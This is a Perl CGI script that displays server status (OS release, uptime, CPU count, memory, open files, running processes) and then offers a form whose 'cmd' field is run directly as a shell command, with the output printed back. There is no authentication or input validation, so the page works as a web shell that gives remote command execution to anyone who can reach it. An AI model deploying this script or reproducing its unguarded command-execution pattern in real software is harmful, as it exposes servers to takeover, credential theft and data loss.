#!/usr/bin/perl
use CGI qw/:standard/;

$ENV{ PATH } = join ':', qw( /bin /usr/bin /usr/local/bin );
print CGI::header( 'text/html' ); 

print h1(`cat /etc/redhat-release`);
print "uptime:".`uptime`."<br><br>";
print "processors inside: ".`cat /proc/cpuinfo |grep -i ^processor | wc -l`."<br><br>";
print "RAM size: <pre>".`cat /proc/meminfo |grep -i ^Mem`."</pre>";
print "opened files: ".`lsof|wc -l`."<br>";
$rp = `ps aux|wc -l`;
$rp = $rp - 1;
print "running proccess: ".$rp."<br>";
print "<pre>".`ps aux`."</pre>";

print "<hr>";
print	start_html('Perl script'),
	h3('Aditional command is possible run here'),
		startform,
		"command: ",
		textfield(-name=>'cmd'),
		p,
		submit(name=>'Run'),
		hr,
	end_html;

if (param()){
	$cmd = param('cmd');
	chomp ($cmd);				#cut the return / line feed character
	print "command output is:<br> ";
	print "<pre>";
	$tmp = '';
	if (!open($tmp, $cmd.'|') ) {
		print 'error: '.$!."<br />\n";
		exit(0);
	}
	while (<$tmp>){
		print $_;
	}
	print "</pre>";
	exit(0);
}
